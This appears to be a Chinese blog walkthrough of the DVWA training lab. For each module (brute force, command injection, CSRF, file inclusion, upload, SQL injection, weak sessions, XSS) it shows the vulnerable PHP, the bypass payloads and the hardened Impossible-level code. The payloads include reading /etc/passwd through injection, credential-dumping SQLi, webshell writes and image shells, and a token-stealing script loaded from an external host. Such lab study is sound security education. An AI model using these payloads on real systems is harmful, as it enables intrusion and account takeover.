##  前言

在我入门的时候是做过DVWA，这次准备花点时间，可能就半天，再次根据代码来漏洞复现，加强记忆，而且也可以学到一些安全加固的知识。

##  部署安装

```
# 拉取镜像
docker pull sqreen/dvwa

# 部署安装
docker run -d -t -p 8888:80 sqreen/dvwa
```

###  LOW

```php
if( isset( $_GET[ 'Login' ] ) ) {
    # 获取用户名和密码
    $user = $_GET[ 'username' ];
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    # 查询验证用户名和密码
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
      # 输出头像和用户名
      $avatar = mysql_result( $result, 0, "avatar" );
      echo "<p>Welcome to the password protected area {$user}</p>";
    }
    else {
        登录失败
    }
    mysql_close();
}
```

不安全点：

>1.使用GET登录，会将用户输入的密码直接暴露在url中
>
>2.用户名和密码都没有进行过滤，存在sql注入
>
>3.登录的密码存在弱口令，直接开始可以爆破来

**SQL注入**

万能密码

```
?username=admin'--+&password=123&Login=Login#
```

**爆破**

直接Burp找个字典或者自己写python脚本

### Medium

源码

```php
// 对用户名和密码进行了过滤
$user = $_GET[ 'username' ];
$user = mysql_real_escape_string( $user );
$pass = $_GET[ 'password' ];
$pass = mysql_real_escape_string( $pass );
$pass = md5( $pass );

// 验证用户名和密码
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

if( $result && mysql_num_rows( $result ) == 1 ) {
    登录成功
}
else {
  sleep( 2 );
    登录失败
}
```

加了个`sleep(2)`，这只是增加了爆破的时间，但性质是一样的

`mysqli_real_escape_string ` 根据当前连接的字符集，对于 SQL 语句中的特殊字符进行转义。意思就是在字符前加个`\`，这种有点属于宽字节注入，用`%df`

###  High

源码

```php
// 检测用户的 token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

// 过滤用户名和密码
$user = $checkToken_GET[ 'username' ];
$user = stripslashes( $user );
$user = mysql_real_escape_string( $user );
$pass = $_GET[ 'password' ];
$pass = stripslashes( $pass );
$pass = mysql_real_escape_string( $pass );
$pass = md5( $pass );

// 数据匹配
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

if( $result && mysql_num_rows( $result ) == 1 ) {
  登录成功
}
else {
  sleep( rand( 0, 3 ) );
  登录失败
}
```

 `stripslashes`:去掉前面的转义符

跟上面不同的是，这个增加`token`的检测

Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置：

```
require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';
```

追踪 dvwaPage.inc.php

```
function checkToken( $user_token, $session_token, $returnURL ) {  # 校验 token
    if( $user_token !== $session_token || !isset( $session_token ) ) {
        dvwaMessagePush( 'CSRF token is incorrect' );
        dvwaRedirect( $returnURL );
    }
}

function generateSessionToken() {  # 当前时间的 md5 值作为 token
    if( isset( $_SESSION[ 'session_token' ] ) ) {
        destroySessionToken();
    }
    $_SESSION[ 'session_token' ] = md5( uniqid() );
}

function destroySessionToken() {  # 销毁 token
    unset( $_SESSION[ 'session_token' ] );
}

function tokenField() {  # 将 token 输出到 input 框中
    return "<input type='hidden' name='user_token' value='{$_SESSION[ 'session_token' ]}' />";
}
```

需要在 user_token 的后面跟上之前从源码中获取到的 token 值

```python

```



###  Impossible

```php
<?php

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Sanitise username input
	$user = $_POST[ 'username' ];
	$user = stripslashes( $user );
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_POST[ 'password' ];
	$pass = stripslashes( $pass );
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Default values
	$total_failed_login = 3;
	$lockout_time       = 15;
	$account_locked     = false;

	// Check the database (Check user information)
	$data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
	$row = $data->fetch();

	// Check to see if the user has been locked out.
	if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
		// User locked out.  Note, using this method would allow for user enumeration!
		//$html .= "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

		// Calculate when the user would be allowed to login again
		$last_login = strtotime( $row[ 'last_login' ] );
		$timeout    = $last_login + ($lockout_time * 60);
		$timenow    = time();

		/*
		print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
		print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
		print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
		*/

		// Check to see if enough time has passed, if it hasn't locked the account
		if( $timenow < $timeout ) {
			$account_locked = true;
			// print "The account is locked<br />";
		}
	}

	// Check the database (if username matches the password)
	$data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR);
	$data->bindParam( ':password', $pass, PDO::PARAM_STR );
	$data->execute();
	$row = $data->fetch();

	// If its a valid login...
	if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
		// Get users details
		$avatar       = $row[ 'avatar' ];
		$failed_login = $row[ 'failed_login' ];
		$last_login   = $row[ 'last_login' ];

		// Login successful
		$html .= "<p>Welcome to the password protected area <em>{$user}</em></p>";
		$html .= "<img src=\"{$avatar}\" />";

		// Had the account been locked out since last login?
		if( $failed_login >= $total_failed_login ) {
			$html .= "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
			$html .= "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
		}

		// Reset bad login count
		$data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		$data->execute();
	} else {
		// Login failed
		sleep( rand( 2, 4 ) );

		// Give the user some feedback
		$html .= "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

		// Update bad login count
		$data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		$data->execute();
	}

	// Set the last login time
	$data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```

## 命令注入 

###  Low

```php
// 获取 ip
$target = $_REQUEST[ 'ip' ];

// 判断操作系统来细化 ping 命令
if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
  // Windows
  $cmd = shell_exec( 'ping  ' . $target );
}
else {
  // *nix 需要手动指定 ping 命令的次数
  $cmd = shell_exec( 'ping  -c 4 ' . $target );
}

// 输出命令执行的结果
echo "<pre>{$cmd}</pre>"; 
```

问题：直接将ip得到的值传给`shell_exec`，没有进行任何的过滤

直接上命令执行，利用命令连接符号

| 符号   | 说明                                                         |
| :----- | :----------------------------------------------------------- |
| A;B    | A 不论正确与否都会执行 B 命令                                |
| A&B    | A 后台运行，A 和 B 同时执行                                  |
| A&&B   | A 执行成功时候才会执行 B 命令                                |
| A\|B   | A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令 |
| A\|\|B | A 执行失败后才会执行 B 命令                                  |

```php
127.0.0.1 ; cat /etc/passwd
127.0.0.1 & cat /etc/passwd
127.0.0.1 && cat /etc/passwd
127.0.0.1 | cat /etc/passwd
123456 || cat /etc/passwd
```

![image-20220324124345386](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203241244294.png)

###  Medium

```php
$substitutions = array(
  '&&' => '',
  ';'  => '',
); 

// 移除黑名单字符
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

只过滤两种，还是可以用上面的

###  High

```
$substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
```

这个管道符是 | 是带空格的，所以这里我们不使用空格的话依然可以绕过

```
127.0.0.1 |cat /etc/passwd
127.0.0.1|cat /etc/passwd
```

###  Impossible

```php
	$target = $_REQUEST[ 'ip' ];
	$target = stripslashes( $target );

	// Split the IP into 4 octects
	$octet = explode( ".", $target );

	// Check IF each octet is an integer
	if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
		// If all 4 octets are int's put the IP back together.
		$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

		// Determine OS and execute the ping command.
		if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
			// Windows
			$cmd = shell_exec( 'ping  ' . $target );
		}
		else {
			// *nix
			$cmd = shell_exec( 'ping  -c 4 ' . $target );
		}

		// Feedback for the end user
		$html .= "<pre>{$cmd}</pre>";
	}
```

检查每一个是否是数字，不好绕过了。

## CSRF

###  Low

```php
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];

if( $pass_new == $pass_conf ):
    $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" .     dvwaCurrentUser() . "';";
```

源码中可以是 GET 方式获取密码，两次输入密码一致的话，然后直接带入带数据中修改密码。这种属于最基础的 GET 型 CSRF.

只需要让用户点击这个网站就可，就可以修改了。

```
http://ip/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#
```

1. **短网址**

百度或者谷歌一下可以找到一大堆在线短网址生成工具，这里工具的[短链在线生成](https://tool.chinaz.com/tools/dwz.aspx)，然后上面那个奇怪的网址短网址后的效果如下：

```none
http://suo.im/5LkFdh
```

这个时候受害者访问这个短网址的话就会重定向到之前那个修改密码的链接

使用 curl -i 可以轻松查看重定向信息

1. **配合 XSS**

这种 XSS 和 CSRF 结合成功率很高，攻击更加隐蔽。

首先新建一个带有 xss 攻击语句的 html 页面，内容如下：

复制成功

```html
<html>
<head>
    <title>XSS&CSRF</title>
</head>
<body>
<script src="http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#"></script>
</body>
</html>
```

然后受害者访问 `http://ip/xss.html` 这个页面的时候，密码就被修改成了 222

核心语句就是通过 `scirpt` 标签的 src 属性来记载攻击 payload 的 URL：



```javascript
<script src="http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#"></script>
```

类似的还可以使用如下标签：

`iframe` 标签使用的话记得添加 `style="display:none;"`，这样可以让攻击更加隐蔽



```html
<iframe src="http://ip/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#" style="display:none;"></iframe>
```

`img` 标签的 src 属性依然也可以实现攻击：

```html
<img src="http://ip/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#">
```

到这里大家应该发现规律了吧，就是 src 属性拥有跨域的能力，只要标签支持 src 的话 都可以尝试一下 xss 与 csrf 结合。

### Medium

中等级别的代码增加了 referer 判断：

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
```

如果 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域的话就无法进行到循环内部，执行修改密码的操作。

这个时候需要我们手动伪造 referer 来执行 CSRF 攻击:



![img](https://image.3001.net/images/20200526/1590484054728.png)

**img**



当然受害者肯定不会帮我们手动添加 referer 的，因为代码使用了 `stripos` 函数来检测 referer，所以这个时候我们得精心构造好一个 html 页面表单：

```html
<html>
<head>
    <meta charset="utf-8">
    <title>CSRF</title>
</head>
<body>

<form method="get" id="csrf" action="http://127.0.0.1:8888/vulnerabilities/csrf/">
    <input type="hidden" name="password_new" value="222">
    <input type="hidden" name="password_conf" value="222">
    <input type="hidden" name="Change" value="Change">
</form>
<script> document.forms["csrf"].submit(); </script>
</body>
</html>
```

该表单通过：

```javascript
<script> document.forms["csrf"].submit(); </script>
```

实现自动触发提交 id 为 csrf 的表单，这个在实战中是比较实用的一个技巧。

1. **目录混淆 referer**

将上述 html 页面放到服务器的 `127.0.0.1` 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：

```payload
http://ip/127.0.0.1/csrf.html
```

1. **文件名混淆 referer**

或者将上述 html 文件重命名为 `127.0.0.1.html`，然后访问如下 payload：

```payload
http://ip/127.0.0.1.html
```

这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败，具体自行测试。

1. **? 拼接混淆 referer**

```payload
http://ip/csrf.html?127.0.0.1
```

因为 ? 后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。

### High

首先来分析一下源码

```bash
# 检测用户的 user_token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

相对于 Low 级别，实际上就是增加了一个 token 检测，这样我们 CSRF 攻击的时候必须知道用户的 token 才可以成功。

关于 DVWA CSRF High 这里网上的文章也形形色色…

这一关思路是使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。下面是配合 DVWA DOM XSS High 来解题的。

1. **JS 发起 HTTP CSRF 请求**

首先新建 csrf.js 内容如下：

```javascript
// 首先访问这个页面 来获取 token
var tokenUrl = 'http://127.0.0.1:8888/vulnerabilities/csrf/';

if(window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
}else{
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

var count = 0;
xmlhttp.withCredentials = true;
xmlhttp.onreadystatechange=function(){
    if(xmlhttp.readyState ==4 && xmlhttp.status==200)
    {
          // 使用正则提取 token
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
          // 发起 CSRF 请求 将 token 带入
        var new_url = 'http://127.0.0.1:8888/vulnerabilities/csrf/?user_token='+token+'&password_new=111&password_conf=111&Change=Change';
        if(count==0){
            count++;
            xmlhttp.open("GET",new_url,false);
            xmlhttp.send();
        }
    }
};
xmlhttp.open("GET",tokenUrl,false);
xmlhttp.send();
```

将这个 csrf.js 上传到外网的服务器上，国光这里临时放在我的网站根目录下：

```payload
http://ip/csrf.js
```

然后此时访问 DVWA DOM XSS 的 High 级别，直接发起 XSS 测试（后面 XSS 会详细来讲解）：



```javascript
http://ip/vulnerabilities/xss_d/?default=English&a=</option></select><script src="http://www.sqlsec.com/csrf.js"></script>
```

这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了

1. **常规思路 HTML 发起 CSRF 请求**

假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。

```html
<script>
  function attack(){
    var token = document.getElementById("get_token").contentWindow.document.getElementsByName('user_token')[0].value
    document.getElementsByName('user_token')[0].value=token;
    alert(token);
    document.getElementById("csrf").submit();
  }
</script>

<iframe src="http://ip/vulnerabilities/csrf/" id="get_token" style="display:none;">
</iframe>

<body onload="attack()">
  <form method="GET" id="csrf" action="http://ip/vulnerabilities/csrf/">
    <input type="hidden" name="password_new" value="111">
    <input type="hidden" name="password_conf" value="111">
    <input type="hidden" name="user_token" value="">
    <input type="hidden" name="Change" value="Change">
  </form>
</body>
```

将上述文件保存为 csrf.html 然后放入到 CORS 白名单目录下，这在实战中比较少见，这里为了演示效果，国光将这个文件放入到靶场服务器的根目录下，然后直接访问这个页面即可发起 CSRF 攻击：

```payload
http://ip/csrf.html
```

### Impossible

下面来看一下 Impossible 的防护方式：

```php
# 依然检验用户的 token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

# 需要输入当前的密码
$pass_curr = $_GET[ 'password_current' ];
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];

# 检验当前密码是否正确
$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
```

这里相对于 High 级别主要就是增加了输入当前密码的选项，这个在实战中还是一种比较主流的防护方式，攻击者不知道原始密码的情况下是无法发起 CSRF 攻击的，另外常见的防护方法还有加验证码来防护。

##  文件包含

###  Low

```php
<?php
$file = $_GET[ 'page' ];

if( isset( $file ) )
    include( $file );
else {
    header( 'Location:?page=include.php' );
    exit;
}
?>
```

问题：page 参数没有任何过滤，然后直接被 include 包含进来，造成文件包含漏洞的产生。

1.文件读取

```php
?page=/etc/passwd
?page=../../../../../../../../../etc/passwd   目录穿越
```

2.远程文件包含

```
?page=http://www.baidu.com/robots.txt
```

3.远程文件getshell

>在自己云服务器上写一个小马，然后直接远程文件包含

4.本地文件getshell

>本地写一个一句话木马，然后文件上传模块上传后得到路径，直接包含。

5.伪协议

- php://filter 文件读取

```php
/fi/?page=php://filter/read=convert.base64-encode/resource=index.php
/fi/?page=php://filter/convert.base64-encode/resource=index.php
```

此时会拿到 base64 加密的字符串，解密的话就可以拿到 index.php 的源码

- php://input getshell

POST 内容可以直接写 shell ，内容如下：

```php
<?php fputs(fopen('info.php','w'),'<?php phpinfo();?>')?>
```

然后访问：

```
http://ip/vulnerabilities/fi/info.php
```

- data:// 伪协议

数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码：

```php
/fi/?page=data:text/plain,<?php phpinfo();?>
/fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b
```

###  Medium

```
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

过滤了 `http://` 和 `https://` 以及 `../` 和 `..`

1.远程文件包含

因为是替换为空，所以可以双写绕过

```php
/fi/?page=hhttps://ttps://www.sqlsec.com/info.txt
```

大小写绕过

```
/fi/?page=HTTPS://www.sqlsec.com/info.txt
```

2.本地文件包含

目录穿越，双写

```
/fi/?page=..././..././..././..././..././etc/passwd
```

绝对路径

```
/fi/?page=/etc/passwd
```

### High

```php
$file = $_GET[ 'page' ];

if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit;
}
```

代码里面要求 page 参数的开头必须是 file，否则直接就 exit 退出

可以利用file协议读取本地文件

```
/fi/?page=file:///etc/passwd
```

###  Impossible

```php
$file = $_GET[ 'page' ];

if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    echo "ERROR: File not found!";
    exit;
}
```

开始想用弱类型，但是好像不行

##  文件上传

### Low

```php
if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// Can we move the file to the upload folder?
	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
		// No
		$html .= '<pre>Your image was not uploaded.</pre>';
	}
	else {
		// Yes!
		$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
	}
}

```

直接上传就行

###  Medium

```php
// 获取文件名、文件类型、以及文件大小
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

// 文件类型 image/jpeg 或者 image/png 且 文件大小小于 100000
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
   ( $uploaded_size < 100000 ) ) {
```

 Content-Type 类型校验，我们正常上传 php 文件，然后直接将其 文件类型修改为 image/png

### High

```php
// h获取文件名、文件后缀、文件大小
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

// 文件后缀是否是  jpg jpeg png 且文件大小 小于 100000
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
   ( $uploaded_size < 100000 ) &&

   // 使用 getimagesize 函数进行图片检测
   getimagesize( $uploaded_tmp ) ) {
      上传图片
      }
```

getimagesize 函数会检测文件是否是图片

getimagesize 函数会检测文件是否是图片，所以这里我们得通过制作图马来绕过这个函数检测。

- Linux 下 图马制作

```php
# 将 shell.php 内容追加到 pic.png
cat shell.php >> pic.png

# png + php 合成 png 图马
cat pic.png shell.php >> shell.png

# 直接 echo 追加
echo '<?php phpinfo();?>' >> pic.png
```

- Windows 下 图马制作

```php
copy pic.png/b+shell.php/a shell.png
```

上传图片马就行

### Impossible

```php
# 时间戳的 md5 值作为文件名
$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

# 检测文件后缀、Content-Type类型 以及 getimagesize 函数检测
if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

  // 删除元数据 重新生成图像
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );
```

文件名随机这里就无法使用截断、重写图片的话，使用图马就也无法绕过。

## SQL注入

### Low

```php
$id = $_REQUEST[ 'id' ]
# 没有过滤就直接带入 SQL 语句中 使用单引号闭合
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
while( $row = mysqli_fetch_assoc( $result ) ) {
        // 回显信息
        $first = $row["first_name"];
        $last  = $row["last_name"];
        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
```

union注入：

payload

```payload
/sqli/?id=-1' union select 1,(select+froup_concat(user,':',password+SEPARATOR+0x3c62723e)+FROM+users)--+&Submit=Submit#
```

### Medium

和 Low 级别不一样的代码主要区别如下

```php
$id = $_POST[ 'id' ];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

可以看到从 GET 型注入变成了 POST 型注入，而且闭合方式不一样，从单引号变成直接拼接到 SQL 语句了。

POST 的数据内容如下：

payload

```payload
/sqli/?id=-1' union select 1,(select+froup_concat(user,':',password+SEPARATOR+0x3c62723e)+from+users)--+&Submit=Submit#
```

### High

主要代码如下：

```php
$id = $_SESSION[ 'id' ];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

从 SESSION 获取 id 值，使用单引号拼接。因为 SESSION 获取值的特点，这里不能直接在当前页面注入，

input 的输入框内容如下：

```none
1' union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)#
```

### Impossible

这个级别的主要防护代码如下：



```php
// Anti-CSRF token 防御 CSRF 攻击
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


$id = $_GET[ 'id' ];
// 检测是否是数字类型
if(is_numeric( $id )) {
  // 预编译
  $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
  $data->bindParam( ':id', $id, PDO::PARAM_INT );
  $data->execute();
  $row = $data->fetch();
```

CSRF、检测 id 是否是数字，prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。

## Weak Session IDs

Session 具有会话认证的作用，生成 Session 尽量要无规律 

### Low

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
```

每次session的值都是`++`,所以我们可以利用遍历来获取信息

### Medium

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
```

根据 time() 时间戳来生成作为 dvwaSession 的值，时间戳实际上也是有规律的，也有猜出的可能，谷歌一下可以找到不少在线时间戳的生成转换工具：[时间戳(Unix timestamp)转换工具 - 在线工具](https://tool.lu/timestamp/)…

### High

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}
```

和 Low 级别类似，只是多了一个 MD5编码，其实本质上是一样的

### Impossible

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible");
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
```

随机数+时间+Impossible，然后sha1编码，这个随机数就可以比较安全的生成cookieXSS (Reflected) 反射型跨站脚本

XSS 版块实际上国光之前单独写了一篇文章总结过：[XSS从零开始](https://www.sqlsec.com/2020/01/xss.html)

## 反射性XSS

### Low

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

可以看看到对`name`变量没有任何的过滤措施，只是单纯的检测了`name`变量存在并且不为空就直接输出到了网页中。

```javascript
<script>alert('XSS')</script>
```

### Medium

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}

?>
```

只是简单的过滤了`<script>`标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。

使用其他的标签，通过事件来弹窗：

```none
<img src=x onerror=alert('XSS')>
```

双写来绕过：

**payload2**

```none
<s<script>cript>alert('XSS')</script>
```

因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的：

**payload3**

```javascript
<Script>alert('XSS')</script>
```

### High

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}

?>
```

大小写和双写都不行了

用其他便签

```javascript
<img src=x onerror=alert('XSS')>
```

### Impossible

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    $html .= "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

`name`变量通过`htmlspecialchars()`函数被HTML实体化后输出在了`<pre>`标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的

## DOM型XSS 

### Low

```html
<div class="vulnerable_code_area">

         <p>Please choose a language:</p>

        <form name="XSS" method="GET">
            <select name="default">
                <script>
                    if (document.location.href.indexOf("default=") >= 0) {
                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
                        document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
                        document.write("<option value='' disabled='disabled'>----</option>");
                    }

                    document.write("<option value='English'>English</option>");
                    document.write("<option value='French'>French</option>");
                    document.write("<option value='Spanish'>Spanish</option>");
                    document.write("<option value='German'>German</option>");
                </script>
            </select>
            <input type="submit" value="Select" />
        </form>
</div>
```

DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言后然后往页面中创建了新的 DOM 节点：

```html
document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
document.write("<option value='' disabled='disabled'>----</option>");
```

这里的`lang`变量通过`document.location.href`来获取到，并且没有任何过滤就直接URL解码后输出在了`option`标签中，以下payload在`Firefox Developer Edition 56.0b9`版本的浏览器测试成功:



```javascript
